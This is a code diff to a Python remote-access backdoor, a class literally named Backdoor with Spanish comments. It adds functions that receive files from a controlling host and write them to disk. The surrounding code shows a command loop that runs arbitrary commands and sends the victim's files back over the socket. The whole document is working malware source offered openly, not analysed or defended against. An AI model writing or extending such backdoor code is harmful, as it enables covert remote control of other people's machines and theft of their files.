@@ -67,6 +67,46 @@ class Backdoor:
             return '[-]El sistema no puede encontrar la ruta especificada'
     
     
+    def receive_file_size(self, sck: socket.socket):
+        # Esta función se asegura de que se reciban los bytes
+        # que indican el tamaño del archivo que será enviado,
+        # que es codificado por el cliente vía struct.pack(),
+        # función la cual genera una secuencia de bytes que
+        # representan el tamaño del archivo.
+        fmt = "<Q"
+        expected_bytes = struct.calcsize(fmt)
+        received_bytes = 0
+        stream = bytes()
+        while received_bytes < expected_bytes:
+            chunk = sck.recv(expected_bytes - received_bytes)
+            stream += chunk
+            received_bytes += len(chunk)
+        filesize = struct.unpack(fmt, stream)[0]
+        return filesize
+
+    def receive_file(self, sck: socket.socket, filename, route):
+        # Leer primero del socket la cantidad de 
+        # bytes que se recibirán del archivo.
+        filesize = self.receive_file_size(sck)
+        # Abrir un nuevo archivo en donde guardar
+        # los datos recibidos.
+        filename = os.path.basename(filename)
+        with open(f'{route}{filename}', "wb") as f:
+            mensaje = '[+]Archivo enviado con éxito'
+            received_bytes = 0
+            # Recibir los datos del archivo en bloques de
+            # 1024 bytes hasta llegar a la cantidad de
+            # bytes total informada por el cliente.
+            while received_bytes < filesize:
+                chunk = sck.recv(1024)
+                if chunk and not (b'no encononontrado' in chunk):                    
+                    f.write(chunk)
+                    received_bytes += len(chunk)
+                else:
+                    mensaje = '[-]Descarga fallida o archivo no encontrado'
+                    break
+        return mensaje
+    
     def send_file(self, sck: socket.socket, filename):
         try:
             # Obtener el tamaño del archivo a enviar.
@@ -82,10 +122,9 @@ class Backdoor:
             sck.sendall(b'[-]Archivo no encononontrado')
     
     def run(self):
-        print(self.reliableRecieve())
         try:
             while True: #Permite al programa ejecutarse indefinidamente
-                command = self.reliableRecieve() #Recibe toda la información que le enviemos
+                command = self.reliableRecieve()
                 if command[0] == 'salir':
                     self.connection.close()
                     exit()
@@ -97,9 +136,8 @@ class Backdoor:
                     commandResults = self.send_file(self.connection, ' '.join(command[2:]))
 
                 elif command[0] == 'up':
-                    file = os.path.basename(' '.join(command[3:]))
-                    self.writeFile(file, command[2], command[1])
-                    commandResults = b'[+]Archivo subido'
+                    filename = os.path.basename(' '.join(command[2:]))
+                    commandResults = self.receive_file(self.connection, filename, command[1])
 
                 else: 
                     commandResults = self.runCommand(command)
